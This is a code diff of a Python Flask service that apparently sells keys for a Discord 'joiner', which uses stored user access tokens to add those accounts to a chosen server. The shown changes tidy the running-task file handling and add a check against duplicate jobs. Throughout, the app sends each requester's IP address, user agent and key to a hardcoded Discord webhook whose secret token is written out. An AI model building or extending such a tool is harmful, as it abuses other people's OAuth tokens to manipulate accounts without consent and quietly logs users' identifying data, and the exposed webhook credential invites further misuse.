@@ -6,6 +6,8 @@ from threading import Thread
 from discord import Embed
 from dhooks import Webhook
 
+os.system("cls || clear")
+
 hook = Webhook("https://discord.com/api/webhooks/1118078324988710932/0jNWwqaDZHiFMgeY8bFqnxeq7FufbWAVudxruFIG1w_RfkSIlVT6INeATgUSAfjQwAP7")
 os.system("clear")
 app = Flask(__name__)
@@ -85,12 +87,22 @@ def joiner(guild_id, key_type, start_from, amount):
                 count += 1
                 continue
             if count >= start_from + amount:
-                f = open('running.txt', 'r').read.splitlines()
-                f2 = open('running.txt', 'a')
-                for i in f:
-                  if guild_id in i:
-                    continue
-                  f2.write(i + "\n")
+                f = open("running.txt", "r")
+                ok = f.read().splitlines()
+                f.close()
+                f = open("running.txt", "w")
+                for i in ok:
+                  if i != str(guild_id):
+                    f.write(i + "\n")
+                f.close()
+                try:
+                   os.remove(f"guilds/{guild_id}.txt")
+                except:
+                    pass
+                try:
+                   os.remove(f"guilds/{guild_id}-total.txt")
+                except:
+                    pass
                 break
             user_id, access_token, re = line.strip().split(':')
             ok = add_to_guild(access_token, user_id, guild_id, key_type)
@@ -140,7 +152,11 @@ def callback():
         em = Embed(description=f"Key has no uses remaining\nIP: {ip}\nUA: {ua}\nKey: {key}\nGuild: {guild_id}", color=00000)
         hook.send(embed=em)
         return jsonify({'error': 'Key already redeemed or has no uses remaining'}), 400
-
+    f = open("running.txt", "r").read().splitlines()
+    if guild_id in f:
+        em = Embed(description=f"This guild already has a running task.\nIP: {ip}\nUA: {ua}\nKey: {key}\nGuild: {guild_id}", color=00000)
+        hook.send(embed=em)
+        return jsonify({'error': 'This guild already has a running task, let it complete before initiating a new one.'}), 400
     key_data['uses'] -= 1
     with open('keys.json', 'w') as f:
         json.dump(keys_data, f, indent=4)
